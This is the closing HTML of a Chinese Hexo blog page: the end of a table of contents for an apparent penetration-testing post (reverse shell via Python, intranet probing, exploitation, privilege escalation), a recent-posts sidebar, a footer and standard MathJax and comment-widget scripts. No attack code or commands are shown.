href="#1-%E5%88%A9%E7%94%A8python%E6%9D%A5%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.1.</span> <span class="toc-text">1.利用python来反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.2.</span> <span class="toc-text">2.内网探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.3.</span> <span class="toc-text">3.漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/11/kunming/" title="【昆明短记】“我寻找什么？寻找潇洒。”"><img src="/2026/01/11/kunming/5C0C7185CF2C2CBB2C798DDE79C5245B.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【昆明短记】“我寻找什么？寻找潇洒。”"/></a><div class="content"><a class="title" href="/2026/01/11/kunming/" title="【昆明短记】“我寻找什么？寻找潇洒。”">【昆明短记】“我寻找什么？寻找潇洒。”</a><time datetime="2026-01-11T12:21:56.000Z" title="发表于 2026-01-11 20:21:56">2026-01-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/07/alpharepair/" title="【论文阅读】【ESEC\FSE 22'】Alpharepair：少训练多做事-通过零样本学习重新审视自动程序修复"><img src="/2026/01/07/alpharepair/alpharepair.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【论文阅读】【ESEC\FSE 22'】Alpharepair：少训练多做事-通过零样本学习重新审视自动程序修复"/></a><div class="content"><a class="title" href="/2026/01/07/alpharepair/" title="【论文阅读】【ESEC\FSE 22'】Alpharepair：少训练多做事-通过零样本学习重新审视自动程序修复">【论文阅读】【ESEC\FSE 22'】Alpharepair：少训练多做事-通过零样本学习重新审视自动程序修复</a><time datetime="2026-01-06T18:20:32.000Z" title="发表于 2026-01-07 02:20:32">2026-01-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/04/CURE/" title="【论文阅读】【ICSE 21'】CURE：用于自动程序修复的代码感知神经机器翻译"><img src="/2026/01/04/CURE/CURE.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【论文阅读】【ICSE 21'】CURE：用于自动程序修复的代码感知神经机器翻译"/></a><div class="content"><a class="title" href="/2026/01/04/CURE/" title="【论文阅读】【ICSE 21'】CURE：用于自动程序修复的代码感知神经机器翻译">【论文阅读】【ICSE 21'】CURE：用于自动程序修复的代码感知神经机器翻译</a><time datetime="2026-01-03T18:20:32.000Z" title="发表于 2026-01-04 02:20:32">2026-01-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/29/pnf/" title="【写在年末】过去，现在和未来"><img src="/2025/12/29/pnf/cj5Jjp32O34GO04crNfmOrdScWD56acHT1oHC4X2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【写在年末】过去，现在和未来"/></a><div class="content"><a class="title" href="/2025/12/29/pnf/" title="【写在年末】过去，现在和未来">【写在年末】过去，现在和未来</a><time datetime="2025-12-29T12:21:56.000Z" title="发表于 2025-12-29 20:21:56">2025-12-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/29/selfapr/" title="【论文阅读】【ASE 22'】SELFAPR：带有测试执行诊断的自监督APR"><img src="/2025/12/29/selfapr/selfapr.PNG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【论文阅读】【ASE 22'】SELFAPR：带有测试执行诊断的自监督APR"/></a><div class="content"><a class="title" href="/2025/12/29/selfapr/" title="【论文阅读】【ASE 22'】SELFAPR：带有测试执行诊断的自监督APR">【论文阅读】【ASE 22'】SELFAPR：带有测试执行诊断的自监督APR</a><time datetime="2025-12-28T18:20:32.000Z" title="发表于 2025-12-29 02:20:32">2025-12-29</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2026 By ZEPHeyrr</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a><br>
+<img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png">
+<a href="http://www.beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">蜀ICP备2023008535号</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const loadMathjax = () => {
+    if (!window.MathJax) {
+      window.MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          enableMenu: true,
+          renderActions: {
+            findScript: [10, doc => {
+              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+                const display = !!node.type.match(/; *mode=display/)
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+                const text = document.createTextNode('')
+                node.parentNode.replaceChild(text, node)
+                math.start = {node: text, delim: '', n: 0}
+                math.end = {node: text, delim: '', n: 0}
+                doc.math.push(math)
+              }
+            }, '']
+          }
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.startup.document.state(0)
+      MathJax.texReset()
+      MathJax.typesetPromise()
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'http://120.46.180.209:8099/',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const init = (el = document, path = location.pathname) => {
+    twikoo.init({
+      el: el.querySelector('#twikoo-wrap'),
+      envId: 'http://120.46.180.209:8099/',
+      region: '',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      },
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    
+
+    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
+      if (el.children.length) {
+        el.innerHTML = ''
+        el.classList.add('no-comment')
+      }
+    })
+  }
+
+  const loadTwikoo = (el, path) => {
+    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
+    else btf.getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(() => init(el, path))
+  }
+
+  if (isShuoshuo) {
+    'Twikoo' === 'Twikoo'
+      ? window.shuoshuoComment = { loadComment: loadTwikoo }
+      : window.loadOtherComment = loadTwikoo
+    return
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
